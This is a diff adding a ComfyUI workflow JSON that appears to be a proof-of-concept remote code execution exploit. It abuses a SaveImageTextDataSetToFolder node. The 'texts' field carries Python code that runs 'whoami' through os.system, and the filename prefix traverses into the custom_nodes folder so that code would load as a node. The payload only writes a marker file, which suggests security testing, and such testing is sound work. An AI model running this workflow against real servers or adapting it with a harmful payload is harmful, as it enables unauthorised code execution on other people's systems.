@@ -1,0 +1,23 @@
+{
+  "1": {
+    "class_type": "EmptyImage",
+    "inputs": {
+      "width": 8,
+      "height": 8,
+      "batch_size": 1,
+      "color": 0
+    }
+  },
+  "2": {
+    "class_type": "SaveImageTextDataSetToFolder",
+    "inputs": {
+      "images": [
+        "1",
+        0
+      ],
+      "texts": "import os\nos.system('whoami > /tmp/RCE_ONLINE_TEST')\nNODE_CLASS_MAPPINGS = {}\n",
+      "folder_name": "x",
+      "filename_prefix": "/tmp/ComfyUI/custom_nodes/rce_30ad85fc"
+    }
+  }
+}
